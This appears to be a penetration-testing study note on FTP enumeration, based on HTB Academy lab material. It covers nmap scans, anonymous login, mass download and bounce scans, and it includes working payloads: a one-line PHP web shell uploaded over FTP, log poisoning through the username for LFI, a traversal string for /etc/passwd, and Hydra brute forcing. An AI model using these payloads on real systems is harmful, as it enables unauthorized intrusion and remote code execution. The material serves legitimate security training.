# 🔍 FTP (File Transfer Protocol) Enumeration

## **Protocol Overview**

**FTP Characteristics:**
- **Ports**: 21 (control), 20 (data)
- **Protocol**: TCP-based
- **Authentication**: Clear-text (unless FTPS)
- **Modes**: Active vs Passive

**FTP Connection Types:**
1. **Active FTP**: Client opens control channel (port 21), server initiates data channel (port 20)
2. **Passive FTP**: Client initiates both control and data channels (firewall-friendly)

**TFTP (Trivial FTP):**
- **Port**: 69/UDP
- **Authentication**: None
- **Features**: Simplified, no directory listing
- **Security**: Local networks only

## **Common FTP Servers**

| Server | Description | Config File |
|--------|-------------|------------|
| **vsftpd** | Very Secure FTP Daemon | `/etc/vsftpd.conf` |
| **ProFTPD** | Professional FTP server | `/etc/proftpd/proftpd.conf` |
| **Pure-FTPd** | Secure FTP server | `/etc/pure-ftpd/pure-ftpd.conf` |

## **vsftpd Configuration Analysis**

**Installation and Setup:**
```bash
sudo apt install vsftpd
cat /etc/vsftpd.conf | grep -v "#"
```

**Key Configuration Settings:**

| Setting | Value | Description |
|---------|-------|-------------|
| `listen=NO` | YES/NO | Run as standalone daemon? |
| `anonymous_enable=NO` | YES/NO | Allow anonymous access? |
| `local_enable=YES` | YES/NO | Allow local users to login? |
| `write_enable=YES` | YES/NO | Allow FTP write commands? |
| `dirmessage_enable=YES` | YES/NO | Display directory messages? |
| `xferlog_enable=YES` | YES/NO | Log uploads/downloads? |
| `connect_from_port_20=YES` | YES/NO | Use port 20 for data? |
| `ssl_enable=NO` | YES/NO | Enable SSL/TLS encryption? |

**User Access Control:**
```bash
# File controlling FTP access
cat /etc/ftpusers

guest
john  
kevin
```

## **Dangerous FTP Configurations**

### **Anonymous Access Settings**
```bash
anonymous_enable=YES              # Allow anonymous login
anon_upload_enable=YES            # Anonymous upload capability  
anon_mkdir_write_enable=YES       # Anonymous directory creation
no_anon_password=YES              # No password required
anon_root=/home/username/ftp      # Anonymous user directory
write_enable=YES                  # Enable write commands
```

### **Information Disclosure Settings**
```bash
hide_ids=YES                      # Hide real UIDs/GIDs (show as 'ftp')
ls_recurse_enable=YES             # Allow recursive listings
chroot_local_user=YES             # Jail users in home directory
chroot_list_enable=YES            # Use chroot list
```

## **FTP Enumeration Techniques**

### **1. Nmap FTP Scanning**

**Basic FTP Scan:**
```bash
# Standard FTP scan
sudo nmap -sV -p21 -sC -A target_ip

# FTP-specific scripts
sudo nmap -p21 --script ftp-* target_ip
```

**Available Nmap FTP Scripts:**
```bash
# Find FTP scripts
find /usr/share/nmap/scripts/ -name "*ftp*"

ftp-anon.nse                   # Anonymous FTP testing
ftp-banner.nse                 # Banner grabbing
ftp-bounce.nse                 # FTP bounce attack testing
ftp-brute.nse                  # FTP brute force
ftp-libopie.nse               # libopie buffer overflow
ftp-proftpd-backdoor.nse      # ProFTPD backdoor detection
ftp-syst.nse                  # System information
ftp-vsftpd-backdoor.nse       # vsftpd backdoor detection
ftp-vuln-cve2010-4221.nse     # ProFTPD directory traversal
```

**Example Nmap Output:**
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1002     1002          220 Apr 16 2021 test.txt
|_Only these file types are allowed: txt, log, cfg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

### **2. Manual FTP Banner Grabbing**

```bash
# Netcat banner grabbing
nc -nv target_ip 21

# Telnet banner grabbing
telnet target_ip 21

# Example response:
220 (vsFTPd 3.0.3)
```

### **3. Anonymous FTP Testing**

```bash
# Basic anonymous login
ftp target_ip
# Username: anonymous
# Password: anonymous (or your email)

# Alternative anonymous credentials
# Username: ftp
# Password: ftp

# Successful anonymous login example:
Connected to target_ip.
220 (vsFTPd 3.0.3)
Name (target_ip:user): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### **4. FTP Directory Enumeration**

**Basic Commands:**
```bash
# List files and directories
ftp> ls
ftp> dir

# Long format listing
ftp> ls -la

# Navigate directories
ftp> cd directory_name
ftp> pwd

# Download files
ftp> get filename.txt
ftp> mget *.txt

# Binary mode for executables/images
ftp> binary
ftp> get application.exe
```

**Mass Download:**
```bash
# Download all accessible files using wget
wget -m --no-passive ftp://anonymous:anonymous@target_ip

# Results in directory structure:
tree target_ip/
└── target_ip
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       └── meetings.txt
    └── Important Notes.txt
```

**File Upload Testing:**
```bash
# Create test file
touch testupload.txt

# Upload test
ftp> put testupload.txt
local: testupload.txt remote: testupload.txt
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.

# Verify upload
ftp> ls
-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
```

## **Advanced FTP Enumeration**

### **1. SSL/TLS FTP (FTPS)**

**Connecting to FTPS:**
```bash
# OpenSSL for FTPS connection
openssl s_client -connect target_ip:21 -starttls ftp

# Certificate information extraction
CONNECTED(00000003)
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, 
        OU = Dev, CN = master.inlanefreight.htb, 
        emailAddress = admin@inlanefreight.htb
```

**Information from SSL Certificates:**
- **Hostname**: master.inlanefreight.htb
- **Organization**: Inlanefreight  
- **Email**: admin@inlanefreight.htb
- **Location**: Sacramento, California

### **2. FTP Bounce Attacks**

**Concept**: Use FTP server as proxy for port scanning
```bash
# Nmap FTP bounce scan
nmap -b anonymous:password@ftp_server target_network

# Manual FTP bounce
ftp> port 192,168,1,100,0,22  # Target 192.168.1.100:22
ftp> list                     # Trigger connection
```

### **3. Configuration File Analysis**

**Common Configuration Weaknesses:**
```bash
# Dangerous permission settings
-rwxrwxrwx files (world-writable)
drwxrwxrwx directories (world-writable)

# Information disclosure
hide_ids=NO (shows real UIDs/GIDs)
ls_recurse_enable=YES (allows recursive listing)

# Authentication bypasses  
anonymous_enable=YES
no_anon_password=YES
```

## **FTP Security Issues**

### **1. Anonymous Access**
- **Risk**: Unauthorized file access/upload
- **Detection**: `ftp-anon` Nmap script
- **Exploitation**: Mass download, malicious uploads

### **2. Clear-text Authentication**
- **Risk**: Credential interception  
- **Detection**: Network sniffing
- **Mitigation**: Use FTPS/SFTP

### **3. Directory Traversal**
- **Risk**: Access outside FTP root
- **Exploitation**: `../../../etc/passwd`
- **Detection**: Manual testing

### **4. Write Permissions**
- **Risk**: Web shell upload
- **Exploitation**: Upload PHP/ASPX shells
- **Impact**: Remote code execution

## **FTP Attack Vectors**

### **1. Web Shell Upload**
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to web-accessible FTP directory
ftp> put shell.php

# Access via web browser
http://target.com/ftp_dir/shell.php?cmd=id
```

### **2. Log Poisoning**
```bash
# Inject code in FTP logs via username
ftp target_ip
# Username: <?php system($_GET['cmd']); ?>

# Include FTP log in LFI
http://target.com/page.php?file=/var/log/vsftpd.log&cmd=id
```

### **3. Configuration Exploitation**
```bash
# Exploit writable config
ftp> put malicious.conf vsftpd.conf

# Service restart triggers malicious config
# Potential RCE or privilege escalation
```

## **FTP Enumeration Checklist**

### **Initial Reconnaissance**
- [ ] Port 21 TCP scan with version detection
- [ ] Anonymous access testing
- [ ] Banner grabbing and version identification
- [ ] SSL certificate analysis (if FTPS)

### **Authentication Testing**
- [ ] Anonymous login attempt
- [ ] Default credentials testing
- [ ] Brute force attack (if applicable)
- [ ] User enumeration

### **Directory Enumeration**
- [ ] Directory listing permissions
- [ ] Recursive listing capabilities
- [ ] Hidden files/directories
- [ ] File permissions analysis

### **File Operations Testing**
- [ ] Download capabilities
- [ ] Upload capabilities  
- [ ] File modification permissions
- [ ] Directory creation permissions

### **Security Testing**
- [ ] Directory traversal attempts
- [ ] FTP bounce attack testing
- [ ] Buffer overflow testing
- [ ] Configuration file access

## **Tools for FTP Enumeration**

### **Command Line Tools**
```bash
# Built-in FTP client
ftp target_ip

# Netcat for raw interaction
nc -nv target_ip 21

# OpenSSL for FTPS
openssl s_client -connect target_ip:21 -starttls ftp

# Wget for mass download
wget -m --no-passive ftp://user:pass@target_ip
```

### **Automated Tools**
```bash
# Nmap with FTP scripts
nmap -p21 --script ftp-* target_ip

# Hydra for brute forcing
hydra -l user -P passwords.txt ftp://target_ip

# FTP enumeration scripts
ftpmap -s target_ip
```

## **Defensive Measures**

### **FTP Server Hardening**
- **Disable anonymous access** unless required
- **Use strong authentication** mechanisms
- **Implement SSL/TLS** encryption (FTPS)
- **Restrict file permissions** and chroot users
- **Log and monitor** FTP activities
- **Regular security updates** and patches

### **Network Security**
- **Firewall rules** to restrict FTP access
- **VPN requirements** for external access
- **Network segmentation** for FTP servers
- **Intrusion detection** for FTP anomalies

---

## **References**

- HTB Academy: Host Based Enumeration - FTP
- vsftpd Documentation: https://security.appspot.com/vsftpd.html
- RFC 959: File Transfer Protocol (FTP)
- OWASP Testing Guide: Testing for FTP 